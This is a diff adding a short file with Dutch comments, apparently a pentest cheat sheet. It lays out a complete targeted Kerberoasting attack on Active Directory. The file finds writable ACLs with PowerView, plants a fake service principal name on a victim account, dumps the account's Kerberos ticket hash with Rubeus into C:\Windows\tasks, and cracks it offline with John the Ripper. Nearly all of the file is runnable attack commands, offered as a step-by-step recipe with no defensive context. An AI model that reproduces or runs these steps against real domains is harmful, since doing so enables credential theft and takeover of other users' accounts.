@@ -1,0 +1,10 @@
+# Targeted Kerberoasting - SPN zetten op user met GenericWrite
+# Stap 1: Check ACL rechten
+powershell -c "Import-Module .\PowerView.ps1; Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'currentuser'}"
+# Stap 2: Check of target al een SPN heeft
+Get-DomainUser -Identity targetuser | select serviceprincipalname
+# Stap 3: SPN zetten (moet uniek zijn in domain)
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='domain/whatever1'}
+# Stap 4: Kerberoast
+.\Rubeus.exe kerberoast /outfile:C:\Windows\tasks\targeted_hashes.txt
+john.exe --wordlist=wordlist.txt targeted_hashes.txt
